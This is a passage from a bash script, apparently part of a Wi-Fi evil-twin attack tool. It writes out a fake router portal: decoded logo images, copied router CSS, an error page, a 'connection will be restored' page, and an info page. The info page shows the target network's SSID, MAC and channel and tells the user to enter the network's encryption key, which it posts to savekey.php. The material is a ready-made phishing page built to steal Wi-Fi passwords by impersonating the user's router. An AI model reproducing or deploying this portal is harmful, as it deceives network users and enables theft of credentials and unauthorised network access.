ABAALAAAAAAUAAoAAAViICSOpFgcTxM4ZSsuz2AgzVO4JPMgY4KyEABjSGQ0FiIFQ5Fo8BADhWNK
VQgggofhAVksDIdEjyrGPnTdReEBODQAjYNXMVIEmE4Iwal4kxoGPT84IwExMzU3hCMnDw8rIiEA
Ow==" | base64 --decode>$DUMP_PATH/data/password_blue_light.gif

echo "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" | base64 --decode>$DUMP_PATH/data/router_m.png
}

function error {
echo "      <link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\">
</HEAD>
</HEAD>

<BODY>
      <blockquote>


    <TABLE id=\"autoWidth\">

      <TBODY>



        <TR>

          <TD colspan=2></TD>

        </TR>


        <TR>

          <TD class=info1 colspan=2>


<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b></TD></TR>


        <TR><TD class=blue colspan=2></TD></TR>
        
<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"Back\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"Back\"/></form></td></tr>




      </TBODY>

    </TABLE>


      </blockquote>
</BODY>

</HTML>
">$DUMP_PATH/data/error.html
}

function final {
echo "<link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\"></HEAD>
</HEAD>

<BODY>
      <blockquote>

    <TABLE id=\"autoWidth\">

      <TBODY>


        <TR>

          <TD class=blue colspan=2></TD>

        </TR>



        <TR>

          <TD class=info1 colspan=2>
          
Your connection will be restored in a few moments.</TD></TR>


        <TR><TD class=blue colspan=2></TD></TR>
        



      </TBODY>

    </TABLE>


</blockquote>
</BODY>

</HTML>
">$DUMP_PATH/data/final.html
}

function infohtml {
echo "<html>
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">

<link rel=\"stylesheet\" type=\"text/css\" href=\"info2.css\" media=\"all\">
</head>
<body bgcolor=\"#F7F8FA\" marginheight=\"0\" marginwidth=\"0\">

<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
  <tbody><tr> 
      <td width=\"2%\">&nbsp;</td><td width=\"5%\"></td><td width=\"93%\"> 
      <div valign=\"top\" align=\"left\"> 
        <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"360\">
           
          </tr>
          <TABLE id=\"autoWidth\">

      <TBODY>
<tr><td><hr color=\"blue\" size=1 width=\"99%\"></td></tr>


                <tr><td colspan=\"2\" >SSID: <b>$Host_SSID</b></td></tr>
        <tr><td colspan=\"2\"  >MAC Address: <b>$Host_MAC</b></td></tr>
        <tr><td colspan=\"2\"  >Channel: <b>$Host_CHAN</b></td></tr>

<tr><td></td></tr>


<tr><td><hr color=\"blue\" size=1 width=\"99%\"></td></tr>
<tr><td></td></tr>

        <TR>

          <TD class=info1 colspan=2>
<br>
For security reasons, enter the <b>$Host_ENC</b> key to access the Internet
<br>
<br>
<div id=\"box\" align=\"left\" >
<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"savekey.php\" >
<tr><td><b>$Host_ENC</b> Key:</td></tr>
<tr><td><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>


        <TR><TD class=blue colspan=2></TD></TR>
                <TR><TD class=blue colspan=2></TD></TR>

        
<tr><td colspan=\"2\"><INPUT name=\"Confirm\" class=\"button\" type=\"submit\" value=\"Confirm\"/></td></tr>

</form></div>

</TD></TR>


      </TBODY>

    </TABLE>
</table></div></td></tr></tbody></table>
</body>
</html>
">$DUMP_PATH/data/info.html
}

function info2 {
echo "html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, font, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td { margin: 0px; padding: 0px; border: 0px none; outline: 0px none; font-weight: inherit; font-style: inherit; font-size: 100%; font-family: inherit; vertical-align: baseline; }
:focus { outline: 0px none; }
body { line-height: 1; color: black; -moz-user-select: none; }
body a { color: rgb(79, 79, 79); text-decoration: none; }
ol, ul { list-style: none outside none; }
table { border-collapse: separate; border-spacing: 0px; }
caption, th, td { text-align: left; font-weight: normal; }
blockquote:before, blockquote:after, q:before, q:after { content: \"\"; }
blockquote, q { quotes: \"\" \"\"; }
body { font-family: Verdana,Geneva,sans-serif; margin: 0px; padding: 0px; text-align: center; font-size: 11px; line-height: 14px; color: rgb(81, 85, 89); }
.panel_general { width: 944px; height: 720px; margin: 0px auto; text-align: left; padding: 0px; }
.left { float: left; }
.right { float: right; }
.centred { text-align: center; margin: 8px 0px; }
.hand { cursor: pointer; }
.txt_hover { color: rgb(112, 145, 167) ! important; text-decoration: underline; }
.panel_header { width: 944px; height: 131px; visibility: hidden; }
.header_content { height: 131px; padding: 38px 40px; }
.header_left { width: 439px; float: left; }
.line_grey { background-color: rgb(229, 229, 229); width: 100%; height: 1px; clear: both; }
input { margin: 6px auto; padding-left: 7px; height: 16px; border: 1px solid rgb(207, 207, 207); font-family: Verdana,Geneva,sans-serif; font-size: 11px ! important; color: rgb(81, 85, 89); }
.buttons_space { margin-left: 50px; } 
">$DUMP_PATH/data/info2.css
}

function info {
echo "
/* ::::: http://192.168.1.1/css/styles.css ::::: */

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, font, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td { margin: 0px; padding: 0px; border: 0px none; outline: 0px none; font-weight: inherit; font-style: inherit; font-size: 100%; font-family: inherit; vertical-align: baseline; }
:focus { outline: 0px none; }
body { line-height: 1; color: black; background: none repeat scroll 0% 0% white; -moz-user-select: none; }
body a { color: rgb(79, 79, 79); text-decoration: none; }
ol, ul { list-style: none outside none; }
table { border-collapse: separate; border-spacing: 0px; }
caption, th, td { text-align: left; font-weight: normal; }
blockquote:before, blockquote:after, q:before, q:after { content: \"\"; }
blockquote, q { quotes: \"\" \"\"; }
body { font-family: Verdana,Geneva,sans-serif; background: url('background.png') repeat-x scroll 0% 0% transparent; margin: 0px; padding: 0px; text-align: center; font-size: 11px; line-height: 14px; color: rgb(81, 85, 89); }
.panel_general { width: 944px; height: 720px; margin: 0px auto; text-align: left; padding: 0px; background: url('background.png') repeat-x scroll 0% 0% transparent; }
.left { float: left; }
.right { float: right; }
.centred { text-align: center; margin: 8px 0px; }
.hand { cursor: pointer; }
.txt_hover { color: rgb(112, 145, 167) ! important; text-decoration: underline; }
.panel_header { width: 944px; height: 131px; visibility: hidden; }
.header_content { height: 131px; padding: 38px 40px; }
.header_left { width: 439px; float: left; }
.home_station { width: 239px; height: 29px; display: block; }
.network_map { margin-top: 18px; width: 124px; height: 21px; display: block; }
.movistar { width: 221px; height: 49px; float: right; }
.options_menu { width: 904px; position: absolute; margin-top: -60px; }
.line { background-color: rgb(81, 85, 89); width: 1px; height: 9px; margin: 4px 12px; }
.line_small { background-color: rgb(160, 165, 169); width: 1px; height: 5px; margin: 6px 10px; }
.password_ico { background: url('password_blue_light.gif') no-repeat scroll 0% 0% transparent; width: 20px; height: 10px; padding-right: 8px; margin-top: 3px; }
.password_ico.hover { background: url('password_blue.gif') no-repeat scroll 0% 0% transparent; }
.faq_ico { background: url('faq_blue_light.png') no-repeat scroll 0% 0% transparent; width: 17px; height: 17px; padding-right: 8px; }
.faq_ico.hover { background: url('faq_blue.png') no-repeat scroll 0% 0% transparent; }
.languages a { color: rgb(160, 165, 169); float: right; }
.languages a:hover { color: rgb(112, 145, 167); text-decoration: underline; }
.footer { height: 34px; }



/* ::::: http://192.168.1.1/css/network_map.css ::::: */

.house { background-image: url('house.png'); width: 940px; height: 538px; }
.internet { position: absolute; width: 65px; height: 66px; margin-top: 262px; }
.internet_txt { position: absolute; width: 66px; text-align: center; font-size: 12px; margin-top: 334px; }
.internet_txt .internet_des { margin-top: 10px; display: block; color: rgb(80, 80, 80); font-size: 11px; line-height: 14px; }
#iconInternet { position: absolute; background: url('internet.png') no-repeat scroll 0% 0% transparent; width: 65px; height: 66px; }
#iconInternet[INTERNET_STATUS=\"INTERNET_OK\"] { background-position: 0px 0px; }
#iconInternet[INTERNET_STATUS=\"ICON_OVER\"] { background-position: -65px 0px; }
#iconInternet[INTERNET_STATUS=\"NO_INTERNET\"] { background-position: -130px 0px; }
.threeG { position: absolute; background: url('3g_bg.png') no-repeat scroll 0% 0% transparent; width: 82px; height: 78px; margin: 210px 0px 0px 100px; }
.threeG_ico { display: block; background: url('3G.png') no-repeat scroll 0% 0% transparent; width: 56px; height: 40px; margin: 4px auto 0px; }
.threeG_ico[power3g=\"-1\"] { background-position: 0px 0px; }
.threeG_ico[power3g=\"0\"] { background-position: -56px 0px; }
.threeG_ico[power3g=\"1\"] { background-position: -112px 0px; }
.threeG_ico[power3g=\"2\"] { background-position: -168px 0px; }
.threeG_ico[power3g=\"3\"] { background-position: -224px 0px; }
.threeG_ico[power3g=\"4\"] { background-position: -280px 0px; }
.threeG_ico.hover[power3g=\"-1\"] { background-position: -336px 0px; }
.threeG_ico.hover[power3g=\"0\"] { background-position: -336px 0px; }
.threeG_ico.hover[power3g=\"1\"] { background-position: -392px 0px; }
.threeG_ico.hover[power3g=\"2\"] { background-position: -448px 0px; }
.threeG_ico.hover[power3g=\"3\"] { background-position: -504px 0px; }
.threeG_ico.hover[power3g=\"4\"] { background-position: -560px 0px; }
.threeG_txt { display: block; margin: 4px 33px; font-size: 12px; }
.adsl { position: absolute; background: url('adsl_bg.png') no-repeat scroll 0% 0% transparent; width: 82px; height: 78px; margin: 308px 0px 0px 100px; }
.adsl_ico { display: block; background: url('app_adsl.png') no-repeat scroll -76px 0px transparent; width: 32px; height: 31px; margin: 22px auto 0px; }
#adsl[adslactive=\"true\"] .adsl_ico { background-position: -152px 0px; }
.adsl_txt { display: block; margin: 5px 26px; font-size: 12px; }
#adsl[adslConfigurable=\"true\"]:hover .adsl_ico { background: url('app_adsl.png') no-repeat scroll -114px 0px transparent; }
#adsl[adslConfigurable=\"true\"]:hover .adsl_txt { color: rgb(112, 145, 167) ! important; text-decoration: underline; }
#wifi { position: absolute; margin: 210px 0px 0px 285px; width: 140px; text-align: center; }
